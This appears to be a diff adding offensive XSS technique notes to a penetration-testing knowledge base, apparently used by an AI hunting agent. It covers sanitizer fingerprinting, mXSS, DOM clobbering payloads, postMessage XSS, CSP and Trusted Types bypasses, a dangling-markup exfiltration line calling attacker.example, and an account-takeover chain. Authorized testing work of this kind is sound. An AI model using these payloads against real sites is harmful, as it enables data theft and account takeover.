@@ -4,7 +4,7 @@ type: technique
 tags: [client-side, exploitation, h1, injection, thm, web, xss]
 phase: exploitation
 date_created: 2026-05-08
-date_updated: 2026-09-10
+date_updated: 2026-11-09
 sources: [thm-adv-xss, thm-web-xss, portswigger-scripts, h1-scraped-xss, payloadsallthethings-xss, git-payloadsallthethings, git-portswigger-all-labs]
 ---
 
@@ -1069,3 +1069,72 @@ already trust, which is a reportable awareness finding.
 Fingerprinting a write-time HTML sanitizer to char-class depth before deadending a stored-XSS sink. Method: plant one report per variant (so one variant's truncation cannot mask the rest; put any unterminated-tag variant LAST), then diff stored readback vs submitted. Observed control class (2026-10 municipal-platform engagement, generic form): tag-span removal case-insensitive; an UNTERMINATED `<` truncates the rest of the string (data-loss, not encoding); character strip of `=` `&` `;` `%` `_` and both quotes. Consequences that close classes in one pass: no `=` means no handler/attribute assignment is expressible even if a tag span survived; `&`+`;` gone kills entity re-materialization; `%` gone kills percent re-materialization; JSON `\u003c` decodes pre-filter (same strip); `_` stripping corrupts JS markers. Alternate write paths matter: check PATCH/edit immutability (424-after-registration = DMS forward) before hunting a second write lane. Variant battery: nested `<scr<script>ipt>`, mixed-case, unclosed, entity, percent, JSON-unicode, bare.
 
 <!-- promoted-slug: char-class-write-sanitizer-fingerprint -->
+
+## mXSS: sanitizer passes, the re-parse mutates
+
+Mutation XSS lives in the ROUND TRIP: the sanitizer approves bytes that
+the browser's HTML parser re-interprets differently on the second parse
+(sanitize -> string -> `innerHTML` insert). Method: build a round-trip
+oracle per sanitize-then-insert path - submit, capture the sanitized
+readback, diff what `innerHTML` renders after re-parse (headless
+`--dump-dom`), escalate any mutated diff. Known-vulnerable DOMPurify
+ranges (fingerprint the version before deadending): CVE-2025-15599
+(3.1.3-3.2.6) and CVE-2026-0540 (2.5.3-2.5.8) - both mXSS via namespace
+confusion. Entry vectors: MathML/SVG namespace confusion, `<noscript>`
+resync (content parses as markup only when scripting is on), `<style>`
+resync, and app code re-writing an attribute AFTER sanitizing
+(`el.setAttribute('href', userValue)` post-sanitize). Expert lane:
+`Skill(hunt-xss-mxss)`.
+
+## DOM clobbering: HTML injection that never executes script
+
+When markup lands but handlers are stripped, clobber a global the app
+later dereferences. Classic patterns (submit as HTML, no script needed):
+
+```
+<form id=x><input name=y></form>         x.y -> the input element
+<a id=x name=y>location</a>              clobbers named lookups
+<img name=body>                          document.body confusion
+```
+
+Then find a gadget that derefs it: `location[x]`, `document[x]`, config
+lookups (`window.CONFIG.api`), analytics loaders, or a `<base href>`
+hijack for relative-src scripts. Gadget hunting is a corpus grep:
+`zg` for bare global derefs in the target's JS, then test whether the
+clobbered value reaches a sink. Also beats some CSP configs: no script
+executes, so script-src never applies. Expert lane: `Skill(hunt-xss-clobber)`.
+
+## postMessage XSS: the listener is the sink
+
+`addEventListener('message', ...)` handlers that write `event.data`
+into `innerHTML`/`eval`/`location` are XSS with a cross-origin trigger.
+Discipline: inventory listeners first (corpus grep for `onmessage` and
+`addEventListener('message')`), then read the origin check. Verdicts:
+NO check = fire from any origin; `e.origin ==` against a wildcard-ish or
+subdomain-confusable value = bypassable; `e.isTrusted` is NEVER a
+control (it excludes cross-origin synthetic events only as a side
+effect, and same-origin iframes still pass). Harness: an attacker-origin
+page that `postMessage`s the victim in an iframe, payload
+`alert(window.origin)` names the executing frame. Expert lane:
+`Skill(hunt-xss-postmessage)`.
+
+## Execution blocked by CSP/Trusted Types: escalate anyway
+
+A CSP wall is not a dead end, it is a lane switch (`Skill(hunt-xss-csp)`).
+First split enforced vs report-only (only enforced blocks). Then walk the
+pivots: JSONP callback on an allowlisted origin, open redirect to a
+`javascript:` landing, missing `base-uri` + relative script srcs, CDN
+AngularJS on the allowlist (sandbox-escape gadget), nonce reflection
+into a script tag. Trusted Types: check for a permissive default policy
+(gadget chains through `innerHTML` sinks still run), iframe collusion
+(policy scoped to the parent, inject a frame whose policy differs), and
+the script-gadget route (TT guards sinks, not `eval`-shaped library
+callbacks). When no execution is possible: dangling-markup exfil
+(`<img src='https://attacker.example/c?data=`), CSS attribute-selector
+oracle against nonces, and the ATO chain once ANY execution lands
+(CSRF token fetch -> email/password change -> sendBeacon).
+
+## Related classes
+
+- `Skill(hunt-xss-csti)`: `{{7*7}}` renders = client-side template injection; framework+version fingerprint, AngularJS sandbox escapes.
+- `Skill(hunt-xss-file)`: SVG/PDF/filename XSS from upload surfaces; serving-origin verdict decides the class.
